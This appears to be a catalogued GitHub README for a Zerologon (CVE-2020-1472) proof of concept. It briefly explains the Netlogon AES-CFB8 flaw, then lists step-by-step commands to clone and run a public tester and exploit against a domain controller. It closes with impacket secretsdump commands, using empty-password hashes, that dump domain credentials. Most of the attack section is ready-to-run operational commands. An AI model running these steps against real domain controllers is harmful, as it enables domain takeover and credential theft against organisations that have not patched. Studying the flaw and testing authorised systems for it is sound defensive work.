# CVE-2020-1472

[CVE-2020-1472] Netlogon Remote Protocol Call (MS-NRPC) Privilege Escalation (Zerologon)

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/murataydemir](https://github.com/murataydemir) |
| Url      | [https://github.com/murataydemir/CVE-2020-1472](https://github.com/murataydemir/CVE-2020-1472)                                               |
| Stars    | 2                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

<b>[CVE-2020-1472] Netlogon Remote Protocol Call (MS-NRPC) Privilege Escalation (Zerologon)</b>

The attack described here takes advantage of flaws in a cryptographic authentication protocol (insecure use of AES-CFB8) that proves the authenticity and identity of a domain-joined computer to the Domain Controller (DC). Due to incorrect use of an AES mode of operation it is possible to spoof the identity of any computer account (including that of the DC itself) and set an empty password (simply sending a number of Netlogon messages in which various fields are filled with zeroes) for that account in the domain. This can then be used to obtain domain admin credentials and then restore the original DC password.

<b>In order to checking CVE-2020-1472</b>
- [X] git clone https://github.com/SecuraBV/CVE-2020-1472.git
- [X] cd CVE-2020-1472
- [X] python3 -m venv env
- [X] source env/bin/activate
- [X] pip install -r requirements.txt
- [X] python zerologon_tester.py EXAMPLE-DC 1.2.3.4 (example: ./zerologon_tester.py DC01 172.16.208.161)

<b>In order to exploit CVE-2020-1472</b>
- [X] git clone https://github.com/dirkjanm/CVE-2020-1472.git
- [X] cd CVE-2020-1472
- [X] python3 -m venv env
- [X] source env/bin/activate
- [X] python cve-2020-1472-exploit.py EXAMPLE-DC 1.2.3.4 (example: ./cve-2020-1472-exploit.py DC01 172.16.208.161)
- [X] git clone https://github.com/SecureAuthCorp/impacket.git
- [X] cd impacket
- [X] pip install .
- [X] python setup.py install
- [X] cd examples

<b>Then, run one of the following command</b><br>

<b>Example format 1:</b> python secretsdump.py domain/example-dc\$@fqdn-of-dc<br>
```./secretsdump.py zerologon.local/DC01\$@DC01.zerologon.local -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc```<br>
<b>Example format 2:</b> python secretsdump.py domain/example-dc\$@ip-of-dc<br>
```./secretsdump.py zerologon.local/DC01\$@172.16.208.161 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc```

![Image of PoC](https://github.com/murataydemir/CVE-2020-1472/blob/master/poc.png)

Original blogpost is available [here](https://www.secura.com/pathtoimg.php?id=2055)<br>
Original repository that includes python test script is available [here](https://github.com/SecuraBV/CVE-2020-1472)<br>
Original repository that includes python exploit script is available [here](https://github.com/dirkjanm/CVE-2020-1472)



## Get the content

```
git clone https://github.com/murataydemir/CVE-2020-1472
cd CVE-2020-1472
```

{% embed url="https://github.com/murataydemir/CVE-2020-1472" %}

<figure><img src="https://avatars.githubusercontent.com/u/16391655?v=4" alt=""><figcaption><p>murataydemir</p></figcaption></figure>
